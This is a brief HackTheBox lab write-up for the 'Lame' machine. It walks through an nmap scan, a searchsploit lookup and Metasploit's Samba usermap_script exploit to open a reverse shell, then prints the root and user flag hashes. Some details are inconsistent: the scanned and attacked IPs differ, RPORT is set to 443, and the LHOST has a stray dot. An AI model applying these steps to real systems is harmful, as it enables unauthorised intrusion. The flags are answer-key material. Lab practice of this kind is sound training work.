# Hackthebox Lab - LAME

## Solution

I scanned the machine with nmap

	sudo nmap -p- -T4 -A 10.10.10.209 > nmap.output

And found two services ftr and samba. The ftp could not be compremised using metasploit but with samba

	searchsploit samba 3.0.20

We could see that there was an exploit active that could be done using metasploit

	search samba 3.0.20
	use exploit/multi/samba/usermap_script
	set RHOST 10.10.10.3
	set RPORT 443
	set LHOST 10.10.14.22.
	set LPORT 1234
	run

I got a remote shell to the machine and search through the files with the hashes:
	
	cat /root/root.txt
	bbe8b2bd2cf96a070d2569a6a1e0d87e
	cat /home/makis/user.txt
	488ba23bf7284cbb855be8b981e28b11
